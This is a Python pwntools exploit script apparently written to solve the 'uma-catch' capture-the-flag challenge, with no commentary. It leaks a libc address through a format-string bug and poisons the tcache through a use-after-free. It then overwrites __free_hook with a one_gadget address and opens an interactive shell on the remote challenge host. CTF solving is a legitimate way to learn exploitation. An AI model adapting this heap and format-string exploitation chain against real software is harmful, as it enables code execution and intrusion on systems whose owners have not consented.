from pwn import *

# p = process('chall')
# p = remote('localhost', 7777)
p = remote('uma-catch.quals.beginners.seccon.jp', 4101)
e = ELF('chall')
libc = ELF('libc-2.27.so')

one_gadget = [0x4f3d5, 0x4f432, 0x10a41c]

def catch(i):
    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', str(i))
    p.sendlineafter('> ', 'bay')

def naming(i, s):
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', str(i))
    p.sendlineafter('> ', s)

def show(i):
    p.sendlineafter('> ', '3')
    p.sendlineafter('> ', str(i))
    return p.recvline()

def dance(i):
    p.sendlineafter('> ', '4')
    p.sendlineafter('> ', str(i))

def release(i):
    p.sendlineafter('> ', '5')
    p.sendlineafter('> ', str(i))

catch(0)
naming(0, '%11$p')

libc.address = int(show(0)[:-1], 16) - 0xe7 -libc.symbols['__libc_start_main']
print(hex(libc.address))

catch(1)
release(1)
naming(1, p64(libc.symbols['__free_hook']))
catch(2)
catch(3)
naming(3, p64(libc.address + one_gadget[1]))
release(0)

p.interactive()

